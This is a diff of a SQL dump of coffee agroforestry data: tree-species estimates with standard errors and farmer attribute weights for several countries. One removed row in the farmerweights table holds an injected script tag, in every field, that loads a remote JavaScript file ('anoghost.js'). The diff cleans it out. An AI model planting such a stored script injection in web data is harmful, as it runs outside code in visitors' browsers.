+(6071, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Soil moisture', 'NULL', 'A.molucana', 'NULL', '1.120', '0.180');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (6072, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Soil moisture', 'NULL', 'C.africana', 'NULL', '3.560', '0.100'),
 (6073, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Soil moisture', 'NULL', 'C.calothyrsus', 'NULL', '0.210', '0.120'),
 (6074, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Soil moisture', 'NULL', 'C.macrostachyus', 'NULL', '0.940', '0.120'),
@@ -5170,12 +5163,12 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (6489, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'A.heterophyllus', 'NULL', '1.550', '0.120'),
 (6490, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'A.molucana', 'NULL', '1.880', '0.230'),
 (6491, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'C.africana', 'NULL', '4.390', '0.110'),
-(6492, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'E.abyssinica', 'NULL', '1.160', '0.270');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(6492, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'E.abyssinica', 'NULL', '1.160', '0.270'),
 (6493, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'E.grandis', 'NULL', '0.770', '0.210'),
 (6494, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'F.albida', 'NULL', '3.910', '0.820'),
 (6495, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'F.mucosa', 'NULL', '3.100', '0.100'),
-(6496, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'F.natalensis', 'NULL', '3.070', '0.080'),
+(6496, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'F.natalensis', 'NULL', '3.070', '0.080');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (6497, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'F.ovata', 'NULL', '3.040', '0.080'),
 (6498, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'F.sur', 'NULL', '2.360', '0.080'),
 (6499, 'Uganda', 'East', 'Arabica', '15', 'Mid altitude', 'Temperature', 'NULL', 'F.sycomorus', 'NULL', '1.780', '0.180'),
@@ -5514,11 +5507,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (23025, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Coffee Yield Optimization', 'NULL', 'Aporosa.villosa', 'NULL', '0.891', '0.086'),
 (23023, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Coffee Yield Optimization', 'NULL', 'Macadamia.integrifolia', 'NULL', '0.897', '0.067'),
 (23022, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Coffee Yield Optimization', 'NULL', 'Delonix.regia', 'NULL', '0.973', '0.103'),
-(23021, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Coffee Yield Optimization', 'NULL', 'Musa.basjoo', 'NULL', '0.957', '0.091');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(23021, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Coffee Yield Optimization', 'NULL', 'Musa.basjoo', 'NULL', '0.957', '0.091'),
 (23020, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Coffee Yield Optimization', 'NULL', 'Folium.alstoniae.Scholaris', 'NULL', '0.921', '0.057'),
 (23019, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Coffee Yield Optimization', 'NULL', 'Phyllanthus.emblica', 'NULL', '1.000', '0.051'),
-(23018, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Limitation of Root Competition', 'NULL', 'Betula.alnoides', 'NULL', '0.000', '0.078'),
+(23018, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Limitation of Root Competition', 'NULL', 'Betula.alnoides', 'NULL', '0.000', '0.078');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (23017, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Limitation of Root Competition', 'NULL', 'Castanopsis.calathiformis', 'NULL', '0.045', '0.064'),
 (23016, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Limitation of Root Competition', 'NULL', 'Litchi.chinensis', 'NULL', '0.236', '0.083'),
 (23015, 'China', 'South Yunnan', 'Arabica', 'China_2017_data', 'medium', 'Limitation of Root Competition', 'NULL', 'Michelia.baillonii', 'NULL', '0.264', '0.082'),
@@ -5833,11 +5826,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (24257, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Tetrameles.nudiflora', 'NULL', '3.536', '0.117'),
 (24258, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Bischofia.javanica', 'NULL', '3.465', '0.083'),
 (24259, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Albizia.lebbekoides', 'NULL', '3.412', '0.084'),
-(24260, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Artocarpus.heterophyllus', 'NULL', '3.352', '0.057');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(24260, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Artocarpus.heterophyllus', 'NULL', '3.352', '0.057'),
 (24261, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Glochidion.fagifolium', 'NULL', '3.485', '0.150'),
 (24262, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Broussonetia.papyrifera', 'NULL', '3.378', '0.099'),
-(24263, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Abrus.precatorius', 'NULL', '3.323', '0.085'),
+(24263, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Abrus.precatorius', 'NULL', '3.323', '0.085');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (24264, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Trema.velutina', 'NULL', '3.060', '0.105'),
 (24265, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Melia.azedarach', 'NULL', '2.859', '0.097'),
 (24266, 'Laos', 'South Laos', 'Arabica', 'LA-SL-AR-20180927', 'medium', 'Shading production', 'NULL', 'Alstonia.scholaris', 'NULL', '2.791', '0.091'),
@@ -6159,11 +6152,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (24584, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Climate regulation', 'NULL', 'Eucalyptus.spp.', 'NULL', '1.891', '0.261'),
 (24585, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Climate regulation', 'NULL', 'Tamarindus.indica', 'NULL', '1.547', '0.195'),
 (24586, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Climate regulation', 'NULL', 'Oroxylum.indicum', 'NULL', '1.118', '0.284'),
-(24587, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Climate regulation', 'NULL', 'Citrus.aurantifolia', 'NULL', '0.000', '0.175');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(24587, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Climate regulation', 'NULL', 'Citrus.aurantifolia', 'NULL', '0.000', '0.175'),
 (24588, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Frost control', 'NULL', 'Dimocarpus.longan', 'NULL', '5.000', '0.137'),
 (24589, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Frost control', 'NULL', 'Leucaena.leucocephala', 'NULL', '4.644', '0.205'),
-(24590, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Frost control', 'NULL', 'Artocarpus.heterophyllus', 'NULL', '3.961', '0.142'),
+(24590, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Frost control', 'NULL', 'Artocarpus.heterophyllus', 'NULL', '3.961', '0.142');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (24591, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Frost control', 'NULL', 'Mangifera.indica', 'NULL', '3.399', '0.111'),
 (24592, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Frost control', 'NULL', 'Litchi.chinensis', 'NULL', '3.401', '0.135'),
 (24593, 'Vietnam', 'North-West Vietnam', 'Arabica', 'VN-NW-AR-20180927', 'medium', 'Frost control', 'NULL', 'Chukrasia.tabularis', 'NULL', '3.941', '0.429'),
@@ -7560,7 +7553,6 @@ CREATE TABLE `farmerweights` (
 --
 
 INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
-(20, ' <script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '2.338'),
 (21, 'Uganda', 'East', 'Arabica', 'High', 'Food', '1.909'),
 (22, 'Uganda', 'East', 'Arabica', 'High', 'Fuel', '1.352'),
 (23, 'Uganda', 'East', 'Arabica', 'High', 'Life Expectancy', '2.039'),
@@ -8252,15 +8244,15 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (709, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Fuel', '0.000'),
 (710, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Fuel', '0.000'),
 (711, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Fuel', '0.000'),
-(712, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Fuel', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(712, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Fuel', '0.000'),
 (713, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Fuel', '0.000'),
 (714, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Fuel', '0.000'),
 (715, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000'),
 (716, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000'),
 (717, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000'),
 (718, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000'),
-(719, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000'),
+(719, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (720, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000'),
 (721, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000'),
 (722, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Life Expectancy', '0.000'),
@@ -8931,8 +8923,7 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (1387, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Weed', '0.000'),
 (1388, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Weed', '0.000'),
 (1389, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
-(1390, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(1390, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
 (1391, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
 (1392, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
 (1393, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
@@ -8940,7 +8931,8 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (1395, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
 (1396, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
 (1397, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
-(1398, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
+(1398, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (1399, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
 (1400, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
 (1401, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Yield', '0.000'),
@@ -9617,15 +9609,15 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (2072, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2073, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2074, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
-(2075, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(2075, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2076, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2077, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2078, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2079, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2080, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2081, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
-(2082, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
+(2082, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (2083, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2084, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
 (2085, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Life Expectancy', '0.000'),
@@ -10291,8 +10283,7 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (2745, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Erosion', '0.000'),
 (2746, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Erosion', '0.000'),
 (2747, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Erosion', '0.000'),
-(2748, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Erosion', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(2748, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Erosion', '0.000'),
 (2749, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Erosion', '0.000'),
 (2750, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Food', '0.000'),
 (2751, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Food', '0.000'),
@@ -10300,7 +10291,8 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (2753, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Food', '0.000'),
 (2754, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Food', '0.000'),
 (2755, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Fuel', '0.000'),
-(2756, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Fuel', '0.000'),
+(2756, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Fuel', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (2757, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Fuel', '0.000'),
 (2758, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Fuel', '0.000'),
 (2759, 'Burundi', 'East', 'Arabica', 'Mid altitude', 'Fuel', '0.000'),
@@ -10965,8 +10957,7 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (3418, 'Burundi', 'East', 'Arabica', 'High altitude', 'Weed', '0.000'),
 (3419, 'Burundi', 'East', 'Arabica', 'High altitude', 'Weed', '0.000'),
 (3420, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
-(3421, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(3421, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
 (3422, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
 (3423, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
 (3424, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
@@ -10974,7 +10965,8 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (3426, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
 (3427, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
 (3428, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
-(3429, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
+(3429, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (3430, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
 (3431, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
 (3432, 'Burundi', 'East', 'Arabica', 'High altitude', 'Yield', '0.000'),
@@ -11641,8 +11633,7 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (4093, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Temperature', '0.000'),
 (4094, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
 (4095, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
-(4096, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(4096, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
 (4097, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
 (4098, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
 (4099, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
@@ -11650,7 +11641,8 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (4101, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
 (4102, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
 (4103, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
-(4104, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
+(4104, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (4105, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
 (4106, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
 (4107, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Timber', '0.000'),
@@ -12327,8 +12319,7 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (4778, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4779, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4780, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
-(4781, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(4781, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4782, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4783, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4784, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
@@ -12336,7 +12327,8 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (4786, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4787, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4788, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
-(4789, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
+(4789, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (4790, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4791, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
 (4792, 'Burundi', 'East', 'Arabica', 'All altitudes', 'Erosion', '0.000'),
@@ -13000,8 +12992,7 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (5450, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5451, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5452, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
-(5453, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(5453, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5454, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5455, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5456, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
@@ -13010,7 +13001,8 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (5459, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5460, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5461, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
-(5462, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
+(5462, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (5463, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5464, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
 (5465, 'Burundi', 'East', 'Arabica', 'Low altitude', 'Weed', '0.000'),
@@ -13614,8 +13606,7 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (6063, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6064, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6065, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
-(6066, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(6066, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6067, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6068, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6069, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
@@ -13623,7 +13614,8 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (6071, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6072, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6073, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
-(6074, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
+(6074, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (6075, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6076, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
 (6077, 'Burundi', 'East', 'Arabica', 'High precipitation', 'capsids', '0.000'),
@@ -14221,15 +14213,15 @@ INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup
 (6669, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
 (6670, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
 (6671, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
-(6672, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000');
-INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
+(6672, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
 (6673, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
